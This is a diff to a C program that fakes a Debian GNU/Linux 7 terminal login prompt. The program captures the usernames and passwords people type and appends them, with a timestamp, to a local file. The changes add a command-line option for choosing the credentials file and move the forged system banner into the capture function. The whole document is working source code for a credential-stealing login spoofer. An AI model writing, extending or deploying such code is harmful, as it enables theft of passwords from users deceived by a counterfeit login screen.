@@ -11,23 +11,33 @@
 #define STDOUT_FD 1
 
 char host[MAX_HOSTNAME_LENGTH];
-
+char* tty;
 /**
  * gets user's credentials and stores them into the specified file
+ *
+ * args:
+ *  filepath - the path for the credentials to be stored
+ *             if NULL use "./credentials"
  * 
  * return values:
  *  0 - completed successfully
  *  1 - supplied username is empty or EOF
  * -1 - could not open file
  */
-int get_credentials()
+int get_credentials(char* filepath)
 {
   char *pass = NULL;
   char user[MAX_INPUT_LENGTH];
   char timestamp[32];
   int fd = 0;
+  
+  if (filepath == NULL)
+    filepath = "./credentials";
 
-  fd = open("./credentials", O_RDWR | O_CREAT | O_APPEND, 0600);
+  printf("\nDebian GNU/Linux 7 %s (%s)\n\n", host, tty+5);
+
+
+  fd = open(filepath, O_RDWR | O_CREAT | O_APPEND, 0600);
   if(fd == -1)
     {
       fprintf(stderr, "Could not append to store file!\nExiting\n");
@@ -83,25 +93,24 @@ void usage()
 	 " -f\tWhere to store the credentials.\n"
 	 " -h\tThis message.\n"
 	 );
+  exit(EXIT_FAILURE);
 }
 
 int main(int argc, char *argv[])
 {
-  char* tty = NULL;
+  char* filepath = NULL;
   int opt = 0;
   int ret = 0; 
-  while((opt = getopt(argc, argv, "fh")) !=-1)
+
+  while((opt = getopt(argc, argv, "f:h")) !=-1)
     {
       switch(opt){
       case 'f':
-	// TODO: set filepath
+	filepath = strdup(optarg);
 	break;
       case 'h':
-	usage();
-	return 0;
-	break;
       default:
-	break;
+	usage();
       }
     }
 
@@ -118,8 +127,8 @@ int main(int argc, char *argv[])
   do
     {
       // TODO: fix (uname)
-      printf("\nDebian GNU/Linux 7 %s (%s)\n\n", host, tty+5);
-      ret = get_credentials();
+
+      ret = get_credentials(filepath);
 
       if (ret == 0)
 	{
